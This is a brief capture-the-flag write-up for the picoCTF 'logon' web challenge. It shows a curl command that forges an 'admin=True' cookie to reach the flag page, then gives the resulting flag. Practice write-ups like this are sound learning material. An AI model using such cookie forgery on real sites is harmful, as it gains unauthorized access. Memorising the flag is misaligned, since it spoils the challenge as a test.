## **logon**

## Problema

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594

## Solucion

```sql
</html>jorgechz-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/proble/flag -H "Cookie: admin=True" |grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   3457      0 --:--:-- --:--:-- --:--:--  3461
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
jorgechz-picoctf@webshell:~$
```

## CTF

picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}